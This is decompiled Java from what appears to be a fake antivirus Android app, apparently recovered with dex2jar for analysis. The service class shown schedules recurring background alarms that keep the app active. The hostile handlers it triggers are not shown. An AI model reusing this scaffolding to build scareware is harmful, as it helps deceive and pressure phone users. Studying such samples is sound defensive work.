package com.worker.androiddefender2;

import android.app.AlarmManager;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.example.androiddefender2.DefenderApplication;

public class AVService extends Service {
  final String LOG_TAG = "avServiceLogs";
  
  private AlarmManager am;
  
  private NotificationManager mNM;
  
  private AlarmManager networkAlarm;
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public void onCreate() {
    super.onCreate();
    Log.d("avServiceLogs", "onCreate");
    this.mNM = (NotificationManager)getSystemService("notification");
    this.am = (AlarmManager)getSystemService("alarm");
    this.networkAlarm = (AlarmManager)getSystemService("alarm");
  }
  
  public void onDestroy() {
    super.onDestroy();
    Log.d("avServiceLogs", "onDestroy");
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    Log.d("avServiceLogs", "onStartCommand");
    setRepeatingAlarm();
    setNetworkAlarm();
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  public void setNetworkAlarm() {
    if (DefenderApplication.getInstance().isOnline()) {
      PendingIntent pendingIntent = PendingIntent.getBroadcast((Context)this, 0, new Intent((Context)this, NetworkAlarm.class), 268435456);
      this.networkAlarm.setRepeating(0, System.currentTimeMillis(), 1500000L, pendingIntent);
    } 
  }
  
  public void setRepeatingAlarm() {
    PendingIntent pendingIntent = PendingIntent.getBroadcast((Context)this, 0, new Intent((Context)this, TimeAlarm.class), 268435456);
    this.am.setRepeating(0, System.currentTimeMillis(), 600000L, pendingIntent);
  }
  
  void someTask() {}
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/AVService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */